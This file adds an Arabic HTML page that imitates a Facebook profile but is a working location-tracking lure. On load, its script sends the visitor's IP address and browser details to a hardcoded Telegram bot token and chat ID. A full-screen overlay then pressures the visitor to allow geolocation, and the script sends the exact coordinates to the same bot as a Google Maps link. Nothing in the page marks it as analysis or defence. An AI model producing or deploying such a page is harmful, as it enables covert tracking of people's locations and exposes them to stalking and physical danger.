@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ملف شخصي فيسبوك</title>
+    <!-- Open Graph tags -->
+    <meta property="og:title" content="ملف شخصي فيسبوك" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://yourwebsite.com/profile" />
+    <meta property="og:image" content="https://yourwebsite.com/path/to/image.jpg" />
+    <meta property="og:description" content="هدي عبده 35 سنة بحب الزمالك" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+        .header {
+            background-color: #ffffff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 8px 16px;
+        }
+        .cover-photo {
+            height: 350px;
+            background-image: url('https://example.com/cover-photo.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        .profile-section {
+            background-color: #ffffff;
+            padding: 16px;
+            margin-top: -90px;
+            border-radius: 0 0 8px 8px;
+        }
+        .profile-picture {
+            width: 168px;
+            height: 168px;
+            border-radius: 50%;
+            border: 4px solid #ffffff;
+            margin-top: -84px;
+        }
+        .profile-name {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 16px 0 8px;
+        }
+        .profile-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 16px;
+        }
+        .profile-button {
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .primary-button {
+            background-color: #1877f2;
+            color: white;
+        }
+        .secondary-button {
+            background-color: #e4e6eb;
+            color: #050505;
+        }
+        .nav-tabs {
+            display: flex;
+            border-top: 1px solid #dddfe2;
+            margin-top: 16px;
+            padding-top: 16px;
+        }
+        .nav-tab {
+            padding: 16px;
+            font-weight: bold;
+            color: #65676b;
+            cursor: pointer;
+        }
+        .nav-tab.active {
+            color: #1877f2;
+            border-bottom: 3px solid #1877f2;
+        }
+        #locationOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #locationPrompt {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        #allowLocationBtn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="locationOverlay">
+        <div id="locationPrompt">
+            <h2>لفتح الحساب قم بعمل سماح</h2>
+            <p>يرجى السماح   لاستخدام التطبيق.</p>
+            <button id="allowLocationBtn">السماح لفتح الصفحة</button>
+        </div>
+    </div>
+
+    <div id="mainContent">
+        <div class="header">
+            <!-- هنا يمكن إضافة شريط البحث وأيقونات التنقل -->
+        </div>
+        
+        <div class="cover-photo" style="background-image: url('https://example.com/cover-photo.jpg');"></div>
+        
+        <div class="profile-section">
+            <img src="https://example.com/profile-picture.jpg" alt="الصورة الشخصية" class="profile-picture">
+            <h1 class="profile-name">هدي عبدو</h1>
+            <div class="profile-buttons">
+                <button class="profile-button primary-button">إضافة صديق</button>
+                <button class="profile-button secondary-button">إرسال رسالة</button>
+                <button class="profile-button secondary-button">المزيد</button>
+            </div>
+            <div class="nav-tabs">
+                <div class="nav-tab active">المنشورات</div>
+                <div class="nav-tab">حول</div>
+                <div class="nav-tab">الأصدقاء</div>
+                <div class="nav-tab">الصور</div>
+                <div class="nav-tab">مقاطع الفيديو</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function sendToTelegram(message) {
+            var telegramBotToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
+            var telegramChatId = '962686305';
+            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            $.post(telegramUrl, {
+                chat_id: telegramChatId,
+                text: message
+            });
+        }
+
+        function checkLocationPermission() {
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        getLocation();
+                    } else if (result.state === 'prompt') {
+                        showLocationPrompt();
+                    } else if (result.state === 'denied') {
+                        alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
+                    }
+                    result.onchange = function() {
+                        if (result.state === 'granted') {
+                            getLocation();
+                        } else if (result.state === 'denied') {
+                            alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
+                        }
+                    };
+                });
+            } else {
+                getLocation();
+            }
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("الجهاز لا يدعم تحديد الموقع.");
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            sendToTelegram(`Location: ${googleMapsLink}`);
+            
+            // إخفاء الإشعار وإظهار المحتوى الرئيسي
+            document.getElementById('locationOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب تحديد الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+
+        function showLocationPrompt() {
+            document.getElementById('locationOverlay').style.display = 'flex';
+        }
+
+        document.getElementById('allowLocationBtn').addEventListener('click', getLocation);
+
+        // الحصول على عنوان الـ IP
+        $.getJSON('https://api.ipify.org?format=json', function(data) {
+            sendToTelegram(`IP Address: ${data.ip}`);
+        });
+
+        // إرسال معلومات المستخدم إلى تلغرام
+        const userInfo = {
+            userAgent: navigator.userAgent,
+            os: navigator.platform,
+            browser: navigator.appName,
+            browserVersion: navigator.appVersion
+        };
+        sendToTelegram(`User Info: ${JSON.stringify(userInfo)}`);
+
+        // التحقق من إذن الموقع عند تحميل الصفحة
+        checkLocationPermission();
+    </script>
+</body>
+</html>
